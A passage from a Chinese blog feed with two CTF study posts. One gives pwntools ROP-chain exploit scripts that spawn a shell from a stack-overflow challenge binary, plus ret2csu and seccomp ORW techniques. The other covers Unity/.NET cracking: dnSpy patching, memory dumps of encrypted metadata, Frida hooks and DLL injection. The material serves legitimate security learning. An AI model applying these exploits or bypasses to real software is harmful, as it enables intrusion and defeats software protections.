; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000471350</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401ce4</span>) <span class="comment"># syscall</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="考点二：无sys无shell"><a href="#考点二：无sys无shell" class="headerlink" title="考点二：无sys无shell"></a>考点二：无sys无shell</h3><p>分两类：</p><h4 id="不限制输入长度："><a href="#不限制输入长度：" class="headerlink" title="不限制输入长度："></a>不限制输入长度：</h4><p><code>ROPgadget --binary ./pwn --ropchain</code>。</p><p>自动化生成payload rop链</p><h4 id="限制输入长度："><a href="#限制输入长度：" class="headerlink" title="限制输入长度："></a>限制输入长度：</h4><p><strong>利用 <code>read</code> 系统调用写入：</strong> 构造一次 <code>sys_read(0, bss_addr, length)</code>，让程序停下来等你输入，你顺势输入 <code>/bin/sh\x00</code> 到 bss 段。接着再构造一次 <code>sys_execve(bss_addr, 0, 0)</code>。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">io=process(<span class="string">&#x27;./gift&#x27;</span>)</span><br><span class="line"></span><br><span class="line">adr_rax_rdx_rbx=<span class="number">0x47f2ea</span></span><br><span class="line">adr_rdi=<span class="number">0x401f2f</span></span><br><span class="line">adr_rsi=<span class="number">0x409f9e</span></span><br><span class="line">adr_bss=<span class="number">0x4C72C0</span></span><br><span class="line">syscall_addr = <span class="number">0x448259</span>   <span class="comment">#不好找</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(adr_rax_rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(adr_rdi)+p64(<span class="number">0</span>)+p64(adr_rsi)+p64(adr_bss)+p64(syscall_addr)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload+=p64(adr_rax_rdx_rbx)+p64(<span class="number">59</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(adr_rdi)+p64(adr_bss)+p64(adr_rsi)+p64(<span class="number">0</span>)+p64(syscall_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#这里 \x00 很重要，它保证了 bss 段里的 /bin/sh 是 null-terminated，否则 execve 可能会读取到 bss 后面乱七八糟的数据，导致调用失败或崩溃。</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="考点三：极其缺-Gadget-——-凑不出系统调用号-rax"><a href="#考点三：极其缺-Gadget-——-凑不出系统调用号-rax" class="headerlink" title="考点三：极其缺 Gadget —— 凑不出系统调用号 rax"></a>考点三：极其缺 Gadget —— 凑不出系统调用号 <code>rax</code></h3><p><strong>特征：</strong> 想执行 <code>execve</code>，64 位下 <code>rax</code> 必须是 59。但是你搜遍了程序，根本没有 <code>pop rax; ret</code>！</p><p><strong>解法（三大骚操作）：</strong></p><ol><li><p><strong>算术运算硬凑：</strong> 找找有没有 <code>xor rax, rax</code> (清零)，然后配合 <code>inc rax</code> (加一) 或者 <code>add rax, 1</code>。连续放 50 多次 <code>add rax, 1 ; ret</code>，这就是为了硬生生把 <code>rax</code> 从 0 加到 59 以触发 <code>execve</code></p></li><li><p><strong>利用函数返回值 (Return Value)：</strong> 在 Linux 系统调用中，<code>read</code> 和 <code>recv</code> 函数执行完后，<strong>会把实际读取到的字节数存放在 <code>rax</code> 寄存器里</strong>。如果你能控制程序执行一次 <code>read</code>，你只需在键盘上精准输入 <strong>59 个字节</strong>的垃圾数据，此时 <code>rax</code> 就神奇地变成了 59！紧接着执行 <code>syscall</code>，直接起飞！</p></li><li><p><strong>SROP (Sigreturn Oriented Programming)：</strong> 如果连算术指令和返回值都借不到，但你能控制 <code>rax = 15</code>（<code>sys_sigreturn</code> 的调用号），你就可以直接伪造整个 CPU 的寄存器上下文状态（极高级考点，后续可以单独开一篇讲）。</p></li></ol><h3 id="考点四：极其缺-Gadget-——-找不到控制-rdx-的指令"><a href="#考点四：极其缺-Gadget-——-找不到控制-rdx-的指令" class="headerlink" title="考点四：极其缺 Gadget —— 找不到控制 rdx 的指令"></a>考点四：极其缺 Gadget —— 找不到控制 <code>rdx</code> 的指令</h3><p><strong>特征：</strong> 在 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 中，第三个参数 <code>envp</code> 需要传给 <code>rdx</code>。但在 64 位程序中，<code>pop rdx; ret</code> 这个指令经常像人间蒸发一样找不到。</p><p><strong>解法：</strong> 如果 <code>rdx</code> 实在找不到，也不一定是绝境。在多数 Linux 内核版本中，如果 <code>rdx</code> 里是些乱七八糟的非零值，<code>execve</code> 依然有可能执行成功。但如果不幸崩溃，你可以尝试利用 64 位 ELF 文件自带的万能函数 <strong><code>__libc_csu_init</code></strong>（也就是经典的 <strong>Ret2csu</strong> 技巧）。这个函数内部有一套极其稳定的寄存器赋值链，可以完美控制 <code>rbx</code>, <code>rbp</code>, <code>r12</code>, <code>r13</code>, <code>r14</code>, <code>r15</code>，并通过 <code>mov rdx, r15</code> 间接控制 <code>rdx</code>。</p><h3 id="考点五：沙盒机制-Seccomp-PRCTL"><a href="#考点五：沙盒机制-Seccomp-PRCTL" class="headerlink" title="考点五：沙盒机制 (Seccomp / PRCTL)"></a>考点五：沙盒机制 (Seccomp / PRCTL)</h3><p><strong>特征：</strong> 题目的确是静态编译，你也算好了所有的 <code>ret2syscall</code> 链，但发过去直接显示 <code>Bad system call</code> (核心已转储)。</p><p><strong>解法：</strong> 这是目前比赛中最常见的一堵墙。出题人用 <code>seccomp</code> 禁用了 <code>execve</code> (59 / 0xb) 这个系统调用。拿到 Shell 已经不可能了，你必须把 <code>ret2syscall</code> 的目标改成 <strong>ORW (Open - Read - Write)</strong>：</p><ol><li><p><strong>Open:</strong> 构造 <code>sys_open(&quot;/flag&quot;, 0)</code>，系统会返回一个文件描述符（通常是 3，因为 0,1,2 被标准输入输出占了）。</p></li><li><p><strong>Read:</strong> 构造 <code>sys_read(3, bss_addr, 0x50)</code>，把 flag 从文件里读到内存的 <code>.bss</code> 段。</p></li><li><p><strong>Write:</strong> 构造 <code>sys_write(1, bss_addr, 0x50)</code>，把 <code>.bss</code> 段里的 flag 打印到你的屏幕（标准输出 1）上。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;之前pwn写到别的地方没往github搬，后面慢慢搬吧&lt;/p&gt;
&lt;h1 id=&quot;栈溢出基础知识：&quot;&gt;&lt;a href=&quot;#栈溢出基础知</summary>
      
    
    
    
    <category term="PWN" scheme="http://example.com/categories/PWN/"/>
    
    <category term="PWN_ATTACK" scheme="http://example.com/categories/PWN/PWN-ATTACK/"/>
    
    <category term="stack_overflow" scheme="http://example.com/categories/PWN/PWN-ATTACK/stack-overflow/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="栈溢出" scheme="http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Unity与.NET逆向</title>
    <link href="http://example.com/2026/01/27/REVERSE/ctf%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84misc/Unity%E4%B8%8E.NET%E9%80%86%E5%90%91/"/>
    <id>http://example.com/2026/01/27/REVERSE/ctf%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84misc/Unity%E4%B8%8E.NET%E9%80%86%E5%90%91/</id>
    <published>2026-01-26T16:00:00.000Z</published>
    <updated>2026-03-12T12:17:01.328Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NET逆向处理："><a href="#NET逆向处理：" class="headerlink" title=".NET逆向处理："></a>.NET逆向处理：</h1><p>拿到exe文件，先拖进dnspy，不识别就拖进ida分析</p><p>.NET编译可以是JIT和AOT两种类型</p><h2 id="JIT-Just-in-Time-——-即时编译"><a href="#JIT-Just-in-Time-——-即时编译" class="headerlink" title="JIT (Just in Time) —— 即时编译"></a>JIT (Just in Time) —— 即时编译</h2><p><strong>一句话解释：</strong> 程序运行的时候，才开始一行一行（或一段一段）地把代码翻译成机器码。</p><ul><li><p><strong>流程：</strong><code>源代码 (C#)</code> $\rightarrow$ <strong>编译器</strong> $\rightarrow$ <code>中间语言 (IL/Bytecode)</code> $\rightarrow$ <code>用户运行</code> $\rightarrow$ <strong>JIT 编译器 (现场翻译)</strong> $\rightarrow$ <code>机器码</code></p></li><li><p><strong>特点：</strong></p><ul><li><p><strong>产物：</strong> 中间语言（IL）。这是一种“半成品”，它保留了极其丰富的原书信息（类名、变量名、结构）。</p></li><li><p><strong>跨平台：</strong> 同一本“英文原著”，带个懂法语的翻译官就能在法国跑（Linux），带个懂德语的就能在德国跑（Windows）。</p></li><li><p><strong>逆向难度低：</strong> 因为 IL 保留了太多信息，dnSpy 这种工具可以直接把 IL “逆向翻译”回源代码，几乎一模一样。</p></li></ul></li><li><p><strong>典型代表：</strong> 标准的 C#, Java, Python (PyPy), JavaScript (V8)。</p></li><li><p><strong>工具：</strong> <strong>dnSpy</strong>, ILSpy (用来读 IL)。</p></li></ul><h2 id="AOT-Ahead-of-Time-——-提前编译"><a href="#AOT-Ahead-of-Time-——-提前编译" class="headerlink" title="AOT (Ahead of Time) —— 提前编译"></a>AOT (Ahead of Time) —— 提前编译</h2><p><strong>解释：</strong> 在程序运行之前，开发者就已经把代码翻译成了机器能懂的“最终指令”。</p><ul><li><p><strong>流程：</strong><br><code>源代码 (C#/C++)</code> $\rightarrow$ <strong>编译器</strong> $\rightarrow$ <code>机器码 (Machine Code/汇编)</code> $\rightarrow$ <code>用户运行</code></p></li><li><p><strong>特点：</strong></p><ul><li><p><strong>产物：</strong> 纯粹的机器码（01010…），对应 x86/x64 汇编指令。</p></li><li><p><strong>启动快：</strong> 因为已经翻译好了，打开就能跑。</p></li><li><p><strong>逆向难度大：</strong> 就像你拿到了翻译好的中文书，原文的“句式结构”、“独特的修辞”（即类名、函数名、元数据）很多都丢了。你只能看到最终意思。</p></li></ul></li><li><p><strong>典型代表：</strong> C, C++, Rust, Go, <strong>C# Native AOT</strong>。</p></li><li><p><strong>工具：</strong> <strong>IDA</strong>, Ghidra (用来读汇编)。 </p></li></ul><h1 id="Unity逆向处理："><a href="#Unity逆向处理：" class="headerlink" title="Unity逆向处理："></a>Unity逆向处理：</h1><p>unity题型一般分为两个框架：</p><p>mono框架IL2CPP 框架</p><p>一般unity逆向给你一个文件夹，里面是游戏内容，也可能是打包后的exe，这种打包过的直接后缀改为zip然后解压缩就可以了</p><h2 id="mono："><a href="#mono：" class="headerlink" title="mono："></a>mono：</h2><p>Mono 后端的 Unity 游戏，本质上就是运行在 Mono 虚拟机上的 .NET 程序。它的逆向流程和你熟悉的普通 .NET 逆向 <strong>90% 是一样的</strong>。</p><h3 id="核心目标"><a href="#核心目标" class="headerlink" title="核心目标"></a>核心目标</h3><p>找到 <strong><code>Assembly-CSharp.dll</code></strong>。</p><p>一般在<code>Game_Data/Managed/Assembly-CSharp.dll</code></p><ul><li><p>Unity 的游戏逻辑默认都写在这个文件里。</p></li><li><p>其他 <code>UnityEngine.dll</code> 等都是官方库，通常不用看。</p></li></ul><h3 id="静态分析-Static-Analysis"><a href="#静态分析-Static-Analysis" class="headerlink" title="静态分析 (Static Analysis)"></a>静态分析 (Static Analysis)</h3><ul><li><p><strong>工具：</strong> <strong>dnSpy</strong> (首选) 或 ILSpy。</p></li><li><p><strong>流程：</strong></p><ol><li><p>把 <code>Assembly-CSharp.dll</code> 拖进 dnSpy。</p></li><li><p>搜索关键字符串（如 “Cheat”, “Coin”, “Damage”）。</p></li><li><p>直接看 C# 源码，逻辑一览无余。</p></li></ol></li><li><p><strong>修改/破解：</strong></p><ol><li><p>右键 -&gt; <code>Edit Method</code>。</p></li><li><p>修改代码（例如 <code>return true;</code> 绕过校验）。</p></li><li><p><code>File</code> -&gt; <code>Save Module...</code> 覆盖原文件。</p></li><li><p>启动游戏，修改生效。</p></li></ol></li></ul><h3 id="动态调试-Dynamic-Debugging"><a href="#动态调试-Dynamic-Debugging" class="headerlink" title="动态调试 (Dynamic Debugging)"></a>动态调试 (Dynamic Debugging)</h3><ul><li><p>Unity Mono 编译出的游戏通常带有调试符号（或者可以通过 dnSpy 强行调试）。</p></li><li><p>将 <code>mono-2.0-bdwgc.dll</code> (Unity 目录下的) 替换为 dnSpy 提供的调试版 mono.dll（如果是老版本 Unity）。</p></li><li><p>在 dnSpy 里选择 <code>Debug</code> -&gt; <code>Start Debugging</code>，选择游戏 exe，直接下断点调试。</p></li></ul><h3 id="常见阻碍"><a href="#常见阻碍" class="headerlink" title="常见阻碍"></a>常见阻碍</h3><ul><li><p><strong>DLL 加密：</strong> 有的游戏打开 <code>Managed</code> 文件夹，发现 DLL 头部被加密了（dnSpy 报错）。</p><ul><li><strong>解法：</strong> 使用 <strong>GameGuardian</strong> (安卓) 或 <strong>Process Hacker</strong> (PC) 在游戏运行时将解密后的 DLL 从内存 Dump 出来</li></ul></li><li><p><strong>混淆：</strong> 类似于 BeeByte 等混淆插件。</p><ul><li><strong>解法：</strong> 使用 <strong>de4dot</strong> 尝试去混淆，或者硬啃。</li></ul></li></ul><h2 id="二、IL2CPP-框架逆向流程"><a href="#二、IL2CPP-框架逆向流程" class="headerlink" title="二、IL2CPP 框架逆向流程"></a>二、IL2CPP 框架逆向流程</h2><p>这是现代商业手游和大型 PC 游戏的主流。Unity 这里的操作是：<strong>把 C# 代码转换成 C++ 代码，再编译成机器码。</strong></p><p>IL（中间语言）没了，dnSpy 也就瞎了。你面对的是汇编指令。</p><h3 id="核心文件"><a href="#核心文件" class="headerlink" title="核心文件"></a>核心文件</h3><p><strong>Android</strong></p><p>源\lib\armeabi-v8a\libil2cpp.so</p><p>源\assets\bin\Data\Managed\Metadata\global-metadata.dat</p><p><strong>PC</strong></p><p><app-name>_Data/il2cpp_data/Metadata/global-metadata.dat</p><p>UnityPlayer.dll</p><p>其中</p><p><strong><code>GameAssembly.dll</code> (或 .so)：</strong> 存放了所有的代码逻辑（汇编）。</p><p><strong><code>global-metadata.dat</code>：</strong> 存放了所有的字符串、类名、方法名、属性名。<strong>这是解密的钥匙！</strong></p><h3 id="神器：Il2CppDumper"><a href="#神器：Il2CppDumper" class="headerlink" title="神器：Il2CppDumper"></a>神器：Il2CppDumper</h3><p>你不能直接用 IDA 看 <code>GameAssembly.dll</code>，因为里面全是 <code>sub_123456</code>，没有名字。<code>Il2CppDumper</code> 的作用就是把 <code>metadata</code> 里的名字提取出来，贴回到 DLL 上。<a href="https://github.com/Jumboperson/Il2CppDumper">GitHub - Jumboperson/Il2CppDumper: Better version of https://github.com/Jumboperson/PokemonGoDumper</a></p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p><code>Il2CppDumper.exe &lt;executable-file&gt; &lt;global-metadata&gt; &lt;output-directory&gt;</code></p><h4 id="输出文件"><a href="#输出文件" class="headerlink" title="输出文件"></a>输出文件</h4><p><strong>DummyDll</strong></p><p>文件夹，包含所有还原的DLL文件</p><p>使用<a href="https://github.com/0xd4d/dnSpy">dnSpy</a>，<a href="https://github.com/icsharpcode/ILSpy">ILSpy</a>或者其他.Net反编译工具即可查看具体信息</p><p>可用于提取Unity的<code>MonoBehaviour</code>和<code>MonoScript</code>，适用于<a href="https://github.com/mafaca/UtinyRipper">UtinyRipper</a>或者<a href="https://7daystodie.com/forums/showthread.php?22675-Unity-Assets-Bundle-Extractor">UABE</a>等</p><p><strong>ida.py</strong></p><p>用于IDA</p><p><strong>ida_with_struct.py</strong></p><p>用于IDA, 读取il2cpp.h文件并在IDA中应用结构信息</p><p><strong>il2cpp.h</strong></p><p>包含结构体的头文件</p><p><strong>ghidra.py</strong></p><p>用于Ghidra</p><p><strong>Il2CppBinaryNinja</strong></p><p>用于BinaryNinja</p><p><strong>ghidra_wasm.py</strong></p><p>用于Ghidra, 和<a href="https://github.com/nneonneo/ghidra-wasm-plugin">ghidra-wasm-plugin</a>一起工作</p><p><strong>script.json</strong></p><p>用于IDA和Ghidra脚本</p><p><strong>stringliteral.json</strong></p><p>包含所有stringLiteral信息</p><p><strong>关于config.json</strong></p><ul><li><p><code>DumpMethod</code>，<code>DumpField</code>，<code>DumpProperty</code>，<code>DumpAttribute</code>，<code>DumpFieldOffset</code>, <code>DumpMethodOffset</code>, <code>DumpTypeDefIndex</code></p><ul><li>是否在dump.cs输出相应的内容</li></ul></li><li><p><code>GenerateDummyDll</code>，<code>GenerateScript</code></p><ul><li>是否生成这些内容</li></ul></li><li><p><code>DummyDllAddToken</code></p><ul><li>是否在DummyDll中添加token</li></ul></li><li><p><code>RequireAnyKey</code></p><ul><li>在程序结束时是否需要按键退出</li></ul></li><li><p><code>ForceIl2CppVersion</code>，<code>ForceVersion</code></p><ul><li>当ForceIl2CppVersion为<code>true</code>时，程序将根据ForceVersion指定的版本读取il2cpp的可执行文件（Metadata仍然使用header里的版本），在部分低版本的il2cpp中可能会用到（比如安卓20版本下，你可能需要设置ForceVersion为16程序才能正常工作）</li></ul></li><li><p><code>ForceDump</code></p><ul><li>强制将文件视为dump文件</li></ul></li><li><p><code>NoRedirectedPointer</code></p><ul><li>将dump文件中的指针视为未重定向的, 从某些设备dump出的文件需要设置该项为<code>true</code></li></ul></li></ul><h4 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h4><h5 id="ERROR-Metadata-file-supplied-is-not-valid-metadata-file"><a href="#ERROR-Metadata-file-supplied-is-not-valid-metadata-file" class="headerlink" title="ERROR: Metadata file supplied is not valid metadata file."></a><code>ERROR: Metadata file supplied is not valid metadata file.</code></h5><p>global-metadata.dat已被加密。关于解密的问题请去相关破解论坛寻求帮助，请不要在issues提问！</p><p>如果你的文件是<code>libil2cpp.so</code>并且你拥有一台已root的安卓手机，你可以尝试我的另一个项目<a href="https://github.com/Perfare/Zygisk-Il2CppDumper">Zygisk-Il2CppDumper</a>，它能够无视global-metadata.dat加密</p><h5 id="ERROR-Can-39-t-use-auto-mode-to-process-file-try-manual-mode"><a href="#ERROR-Can-39-t-use-auto-mode-to-process-file-try-manual-mode" class="headerlink" title="ERROR: Can&#39;t use auto mode to process file, try manual mode."></a><code>ERROR: Can&#39;t use auto mode to process file, try manual mode.</code></h5><p>请注意PC平台的可执行文件是<code>GameAssembly.dll</code>或者<code>*Assembly.dll</code></p><p>你可以打开一个新的issue，并上传文件，我会尝试解决</p><h5 id="ERROR-This-file-may-be-protected"><a href="#ERROR-This-file-may-be-protected" class="headerlink" title="ERROR: This file may be protected."></a><code>ERROR: This file may be protected.</code></h5><p>Il2CppDumper检测到可执行文件已被保护，使用<code>GameGuardian</code>从游戏内存中dump <code>libil2cpp.so</code>，然后使用Il2CppDumper载入按提示操作，可绕过大部分保护</p><p>如果你拥有一台已root的安卓手机，可以尝试另一个项目<a href="https://github.com/Perfare/Zygisk-Il2CppDumper">Zygisk-Il2CppDumper</a>，它能够绕过几乎所有保护</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>随后把dll文件或者so文件放入相对应的 IDA，再按 ALT + F7 选择<strong>ida_with_struct.py</strong>，再选择<strong>script.json</strong>，<strong>il2cpp.h</strong>，导入符号表就可以分析了</p><h3 id="动态分析-Hook-与-修改"><a href="#动态分析-Hook-与-修改" class="headerlink" title="动态分析 (Hook 与 修改)"></a>动态分析 (Hook 与 修改)</h3><p>因为是机器码，你不能像 Mono 那样直接用 dnSpy 修改并保存。通常采用 <strong>Hook (挂钩)</strong> 技术。</p><ul><li><p><strong>Frida (安卓/PC)：</strong></p><ul><li><p>编写 JavaScript 脚本，根据函数偏移地址（Offset）进行 Hook。</p></li><li><p>比如：<code>Interceptor.attach(base_addr.add(0x123456), ...)</code>，强行修改入参或返回值。</p></li></ul></li><li><p><strong>Cheat Engine / 内存修改器：</strong></p><ul><li>搜索数值，定位内存，编写汇编注入脚本（AA Script）。</li></ul></li><li><p><strong>DLL 劫持 / 注入：</strong></p><ul><li>编写一个 C++ DLL，注入到游戏进程，利用 <code>MinHook</code> 等库，修改关键函数的逻辑。</li></ul></li></ul><h2 id="IL2CPP框架的metadata混淆（进阶）"><a href="#IL2CPP框架的metadata混淆（进阶）" class="headerlink" title="IL2CPP框架的metadata混淆（进阶）"></a>IL2CPP框架的metadata混淆（进阶）</h2><h3 id="第一阶段：怎么看-Metadata-是否被混淆？-诊断"><a href="#第一阶段：怎么看-Metadata-是否被混淆？-诊断" class="headerlink" title="第一阶段：怎么看 Metadata 是否被混淆？(诊断)"></a>第一阶段：怎么看 Metadata 是否被混淆？(诊断)</h3><p>拿到 <code>global-metadata.dat</code> 后，不要急着丢进 Dumper，先用 <strong>Hex Editor (如 010 Editor / HxD)</strong> 打开它，看“头”和“身”。</p><h4 id="看“魔数”"><a href="#看“魔数”" class="headerlink" title="看“魔数”"></a>看“魔数”</h4><p>标准的 <code>global-metadata.dat</code> 文件头的前 4 个字节是固定的。</p><ul><li><p><strong>正常情况：</strong> 你会看到十六进制：<strong><code>AF 1B B1 FA</code></strong> (小端序读取就是 <code>0xFAB11BAF</code>)。</p></li><li><p><strong>被混淆/加密：</strong> 如果你看到的是乱七八糟的字节（例如 <code>12 34 56 78</code> 或完全随机），或者全是 <code>00</code>，说明文件头被改了，或者整个文件被加密了。</p></li></ul><h4 id="看-Il2CppDumper-的报错"><a href="#看-Il2CppDumper-的报错" class="headerlink" title="看 Il2CppDumper 的报错"></a>看 Il2CppDumper 的报错</h4><p>直接把 <code>GameAssembly.dll</code> 和 <code>global-metadata.dat</code> 拖进 Il2CppDumper。</p><ul><li><p><strong>正常：</strong> 顺利输出 <code>dump.cs</code> 和 <code>script.json</code>。</p></li><li><p><strong>被混淆：</strong> 控制台会报红字错误：</p><ul><li><p><code>ERROR: Metadata file supplied is not valid metadata file.</code> (头不对)</p></li><li><p><code>ERROR: Invalid Sanity</code> (版本号校验失败)</p></li></ul></li></ul><h4 id="看熵值"><a href="#看熵值" class="headerlink" title="看熵值"></a>看熵值</h4><p>如果文件头是正常的 <code>AF 1B B1 FA</code>，但 Dumper 还是报错，可能是<strong>中间混淆</strong>。</p><ul><li><p><strong>正常：</strong> Metadata 里会有大量的明文字符串（如 <code>UnityEngine</code>, <code>PlayerController</code>）。在 Hex Editor 右侧的文本区能看到很多可读单词。</p></li><li><p><strong>被混淆：</strong> 右侧文本区看起来全是乱码，或者看起来像压缩包一样密集。这说明字符串池被加密了。</p></li></ul><hr><h3 id="第二阶段：如果被混淆，该怎么分析？"><a href="#第二阶段：如果被混淆，该怎么分析？" class="headerlink" title="第二阶段：如果被混淆，该怎么分析？"></a>第二阶段：如果被混淆，该怎么分析？</h3><p>既然游戏能运行，说明它<strong>一定要在内存里解密 Metadata</strong>。我们的核心思路就是：<strong>等它解密完，直接去抢！</strong></p><h4 id="策略一：内存-Dump-法"><a href="#策略一：内存-Dump-法" class="headerlink" title="策略一：内存 Dump 法"></a>策略一：内存 Dump 法</h4><p>既然你已经学会了 <strong>Process Hacker</strong> 和内存提取，这招对你来说最顺手。</p><p><strong>原理：</strong> 游戏启动 -&gt; 读取加密的 metadata -&gt; <strong>在内存中解密</strong> -&gt; 传给 IL2CPP 引擎初始化。我们要做的就是在这个“解密后”的时间点，把那一块内存 Dump 下来。</p><p><strong>操作步骤 (PC端为例)：</strong></p><ol><li><p><strong>运行游戏</strong>，进入主界面。</p></li><li><p>打开 <strong>Process Hacker</strong> (管理员)。</p></li><li><p>在游戏进程内存中搜索特征码 <strong><code>AF 1B B1 FA</code></strong>。</p><ul><li>因为解密后的 Metadata 必须恢复这个头，引擎才能识别。</li></ul></li><li><p>找到后，把从这个头开始的整块内存（通常几 MB 大小）Dump 出来。</p></li><li><p>把 Dump 出来的文件重命名为 <code>global-metadata.dat</code>，配合原来的 <code>GameAssembly.dll</code> 丢进 Il2CppDumper。</p><ul><li>_注：这种方法叫“落地还原”。_</li></ul></li></ol><p><strong>针对安卓端 (Frida/Zygisk)：</strong> 如果是在手机上，手动搜内存太慢，推荐使用自动化工具：</p><ul><li><p><strong>Zygisk-Il2CppDumper：</strong> 这是一个 Magisk 模块。安装后启动游戏，它会自动 Hook 游戏的初始化函数，把解密好的 metadata 自动保存到手机存储里。</p></li><li><p><strong>frida-il2cpp-bridge：</strong> 使用 Frida 脚本直接 dump。</p></li></ul><h4 id="策略二：静态逆向解密逻辑"><a href="#策略二：静态逆向解密逻辑" class="headerlink" title="策略二：静态逆向解密逻辑"></a>策略二：静态逆向解密逻辑</h4><p>如果你想搞清楚它是怎么加密的（比如为了写通用的解密器），就需要逆向 <code>GameAssembly.dll</code>。</p><p><strong>原理：</strong> IL2CPP 引擎加载 Metadata 的代码是开源的。通常入口在 <code>il2cpp::vm::MetadataLoader::LoadMetadataFile</code>。开发者通常会修改这个函数，在读取文件后插入一段 <code>XOR</code> 或 